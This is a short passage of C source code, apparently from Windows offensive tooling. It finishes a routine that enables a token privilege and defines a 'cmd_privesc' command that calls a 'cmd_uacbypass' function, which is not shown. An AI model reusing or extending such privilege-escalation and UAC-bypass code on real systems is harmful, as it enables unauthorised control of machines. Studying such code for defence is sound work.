        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        adv->AdjustTokenPrivileges(htok, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(htok);
}

int cmd_privesc(char *out, size_t sz)
{
    return cmd_uacbypass(NULL, out, sz);
}
